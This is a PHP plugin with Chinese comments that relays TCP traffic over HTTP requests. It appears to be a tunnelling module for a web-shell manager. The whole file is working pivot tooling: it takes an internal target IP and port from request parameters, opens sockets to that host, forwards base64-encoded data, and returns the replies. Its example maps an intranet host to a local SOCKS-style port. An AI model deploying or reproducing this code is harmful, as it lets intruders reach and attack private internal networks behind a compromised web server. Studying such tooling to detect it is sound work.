<?php
/**
 * PortMappingService.php - 端口映射服务插件
 * 
 * 功能：实现内网穿透的端口映射功能
 * 将内网指定的 IP:PORT 映射到本地端口
 * 
 * 示例：将内网 172.26.32.1:7000 映射到本地 1080 端口
 */

/**
 * 创建端口映射配置（保存目标信息到 session）
 * @return string "ok" 或 "error:错误信息"
 */
function createMapping() {
    global $_SES;
    
    $mappingId = get("mappingId");        // 映射唯一标识符
    $targetIP = get("targetIP");          // 目标IP
    $targetPort = get("targetPort");      // 目标端口
    
    // 参数验证
    if ($mappingId == null || $targetIP == null || $targetPort == null) {
        return "error: mappingId, targetIP or targetPort is null";
    }
    
    // 初始化映射存储数组（如果不存在）
    if (!isset($_SES['port_mappings'])) {
        $_SES['port_mappings'] = array();
    }
    
    try {
        // 保存映射配置到会话中
        $_SES['port_mappings'][$mappingId] = array(
            'target_ip' => $targetIP,
            'target_port' => $targetPort,
            'created_at' => time()
        );
        
        return "ok";
        
    } catch (Exception $e) {
        return "error: exception - " . $e->getMessage();
    }
}

/**
 * 在同一个请求中完成写入和读取操作
 * 这是端口映射的核心方法，解决了 PHP session 无法保持 socket 状态的问题
 * @return string "ok" + base64数据 或 "ok"(无数据) 或 "error:错误信息"
 */
function doReadWrite() {
    global $_SES;
    
    $mappingId = get("mappingId");
    $extraData = get("extraData");
    
    // 参数验证
    if ($mappingId == null) {
        return "error: mappingId is null";
    }
    
    // 检查映射是否存在
    if (!isset($_SES['port_mappings']) || !isset($_SES['port_mappings'][$mappingId])) {
        return "error: mapping not found for id: {$mappingId}";
    }
    
    $mapping = $_SES['port_mappings'][$mappingId];
    $targetIP = $mapping['target_ip'];
    $targetPort = $mapping['target_port'];
    
    try {
        // 创建新的 TCP 连接到目标
        $socket = @fsockopen($targetIP, intval($targetPort), $errno, $errstr, 10);
        
        if ($socket === false) {
            return "error: failed to connect to {$targetIP}:{$targetPort}, errno={$errno}, errstr={$errstr}";
        }
        
        // 设置为阻塞模式（确保写入完成）
        @stream_set_blocking($socket, true);
        @stream_set_timeout($socket, 10);
        
        // 步骤1: 如果有数据需要写入，先写入
        if ($extraData != null && strlen($extraData) > 0) {
            $data = base64_decode($extraData);
            
            if ($data === false) {
                @fclose($socket);
                return "error: failed to decode base64 data";
            }
            
            // 写入数据到目标
            $written = @fwrite($socket, $data);
            
            if ($written === false) {
                @fclose($socket);
                return "error: failed to write data to socket";
            }
            
            // 刷新输出缓冲区
            @fflush($socket);
        }
        
        // 步骤2: 读取响应数据
        // 等待一小段时间让服务器处理请求
        usleep(50000); // 50ms
        
        // 设置为非阻塞模式读取
        @stream_set_blocking($socket, false);
        
        $responseData = "";
        $maxAttempts = 10; // 最多尝试10次
        $attempt = 0;
        
        while ($attempt < $maxAttempts) {
            $chunk = @fread($socket, 8192);
            
            if ($chunk === false) {
                break;
            }
            
            if (strlen($chunk) > 0) {
                $responseData .= $chunk;
                $attempt = 0; // 重置计数器，因为还有数据
            } else {
                $attempt++;
                usleep(20000); // 等待20ms
            }
            
            // 检查连接是否关闭
            if (@feof($socket)) {
                break;
            }
        }
        
        // 关闭连接
        @fclose($socket);
        
        // 返回结果
        if (strlen($responseData) > 0) {
            $encodedData = base64_encode($responseData);
            return "ok" . $encodedData;
        } else {
            return "ok";
        }
        
    } catch (Exception $e) {
        if (isset($socket) && is_resource($socket)) {
            @fclose($socket);
        }
        return "error: exception - " . $e->getMessage();
    }
}

/**
 * 关闭指定的端口映射
 * @return string "ok" 或 "error:错误信息"
 */
function closeMapping() {
    global $_SES;
    
    $mappingId = get("mappingId");
    
    // 参数验证
    if ($mappingId == null) {
        return "error: mappingId is null";
    }
    
    try {
        if (isset($_SES['port_mappings']) && isset($_SES['port_mappings'][$mappingId])) {
            unset($_SES['port_mappings'][$mappingId]);
        }
        
        return "ok";
        
    } catch (Exception $e) {
        return "error: exception - " . $e->getMessage();
    }
}

/**
 * 清理所有端口映射配置
 * @return string "ok" 或 "error:错误信息"
 */
function clearAllMappings() {
    global $_SES;
    
    try {
        if (isset($_SES['port_mappings'])) {
            $_SES['port_mappings'] = array();
        }
        
        return "ok";
        
    } catch (Exception $e) {
        return "error: exception - " . $e->getMessage();
    }
}

// ====== 插件入口 - 方法调度 ======

$methodName = get("methodName");

if ($methodName == null) {
    return "error: methodName is null";
}

// 根据方法名调用相应的函数
if ($methodName == "createMapping") {
    return createMapping();
} else if ($methodName == "doReadWrite") {
    return doReadWrite();
} else if ($methodName == "closeMapping") {
    return closeMapping();
} else if ($methodName == "clearAllMappings") {
    return clearAllMappings();
} else {
    return "error: method '{$methodName}' not found";
}


